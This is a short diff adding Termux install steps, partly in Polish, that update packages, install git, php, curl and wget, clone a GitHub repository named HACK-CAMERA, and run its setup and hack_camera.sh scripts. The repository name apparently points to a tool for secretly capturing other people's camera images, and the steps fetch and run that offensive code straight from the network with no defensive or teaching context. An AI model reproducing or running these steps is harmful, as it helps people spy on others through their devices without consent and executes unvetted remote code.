@@ -1,0 +1,12 @@
+apt update && apt upgrade -y
+apt install git -y
+apt install php
+apt install curl -y
+apt install wget -y
+git clone https://github.com/XPH4N70M/HACK-CAMERA.git
+cd HACK-CAMERA
+chmod +x hack_camera.sh (optional)
+bash setup
+bash hack_camera.sh
+Dla polecenia dodatkowego Termux
+ termux-setup-storage
